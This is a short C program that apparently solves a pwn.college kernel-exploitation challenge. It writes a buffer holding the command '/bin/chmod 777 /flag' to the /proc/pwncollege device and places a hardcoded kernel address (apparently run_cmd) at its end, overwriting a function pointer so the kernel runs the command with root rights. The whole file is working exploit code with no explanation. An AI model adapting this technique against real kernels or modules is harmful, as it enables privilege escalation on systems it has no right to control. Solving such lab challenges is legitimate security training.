#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>

#define RUN_CMD 0xffffffff81089b30
#define LENGTH 0x108

int main(){
  int fd;

  if ((fd = open("/proc/pwncollege",O_RDWR)) < 0) {
    perror("open");
  }

  char buf[LENGTH] = "/bin/chmod 777 /flag";
  *(unsigned long*)(buf+LENGTH-8) = RUN_CMD;
  write(fd, buf, LENGTH);
}
